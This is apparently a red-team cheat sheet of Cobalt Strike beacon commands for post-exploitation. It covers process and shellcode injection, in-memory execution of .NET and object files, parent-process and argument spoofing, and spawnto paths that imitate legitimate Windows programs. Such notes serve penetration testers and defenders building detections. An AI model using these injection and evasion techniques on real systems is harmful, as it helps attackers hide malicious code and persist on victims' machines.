---
author(s):
  - Userware
tags:
  - post-exploitation
  - defense-evasion
  - process-injection
  - cobalt-strike
  - windows
---
# Cobalt Strike

## 01 - Migrate Process

Inject to spawn beacon session.

```
beacon> inject <pid> <architecture> <listener>
```

## 02 - Inject Process

Run powershell through another process.

```
beacon> psinject <pid> <arch> <cmdlet> [args]
```

Run .NET binary through a temporary process when running `spawnto` beacon command otherwise it defaults back to `rundll32.dll`.

```
beacon> execute-assembly /path/to/compiled_dotnet_tool.exe [arguments]
```

Inject DLL file in another process.

```
beacon> dllload <pid> c:\path\to\remove\shell.dll
```

Execute beacon object file through memory in the current process.

```
beacon> inline-execute /path/to/objectfile.o [arguments]
```

## 03 - Inject Shellcode

Inject shellcode.

```
beacon> shinject <pid> /path/to/shellcode.bin
```

Spawn a new process and inject shellcode.

```
beacon> shspawn x64
```

Spawn shellcode and tunnel.

```
beacon> spunnel <pid> /path/to/shellcode.bin
```

## 04 - Spoof Process

Spoof a parent process that is ready to spawn a new child process.

```
beacon> ppid <ppid>
```

## 05 - Spawn Beacon Session

Spawn new beacon process with under different user credentials as provided.

```
beacon> spawnas <domain>\<username> <password>
```

Specify a path of the new executable program to inject beacon shellcode other than specified in the malleable c2 profile. By default it injects `rundll32.exe` when executing `spawn`.

```
beacon> spawnto <arch> <path> <args>

beacon> spawnto x86 c:\program files (x86)\internet explorer\iexplore.exe

beacon> spawnto x86 C:\Program Files (x86)\Common Files\Java\Java Update\jucheck.exe
```

Spawn new beacon process.

```
beacon> spawn <arch> <listener>
```

## 06 - Spoof Arguments

```
beacon> argue <command> [args]
```

---
## References

- [Rasta Mouse: Cobalt Strike Spawn Tunnel](https://rastamouse.me/cobalt-strike-spawn-tunnel/)